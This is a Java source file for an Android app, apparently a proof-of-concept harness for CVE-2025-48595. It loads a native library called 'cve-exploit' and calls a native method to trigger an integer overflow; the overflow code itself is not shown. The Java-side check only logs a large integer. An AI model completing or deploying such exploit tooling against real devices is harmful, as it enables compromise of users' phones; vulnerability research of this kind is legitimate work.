package com.example.android_poc;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String TAG = "CVE-2025-48595";

    // Подключение нативной библиотеки (имя файла .so должно совпадать)
    static {
        System.loadLibrary("cve-exploit");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i(TAG, "App started. Initializing POC...");

        // Запуск уязвимости
        triggerIntegerOverflow();

        Toast.makeText(this, "CVE-2025-48595 Triggered", Toast.LENGTH_LONG).show();
    }

    private void triggerIntegerOverflow() {
        try {
            // 1. Вызываем нативный метод, где происходит реальное поведение памяти
            triggerIntegerOverflowNative();

            // 2. Дополнительная проверка в Java (опционально)
            int maliciousValue = Integer.MAX_VALUE;

            // Если значение передается в системный компонент, который ожидает size_t,
            // но получает int, может произойти оверфлоу при приведении типов или умножении.
            Log.i(TAG, "Java-side value: " + maliciousValue);

        } catch (Exception e) {
            Log.e(TAG, "Exception during trigger: " + e.getMessage(), e);
            // В реальном сценарии здесь может произойти падение процесса
        }
    }

    // Декларация нативного метода
    private native void triggerIntegerOverflowNative();
}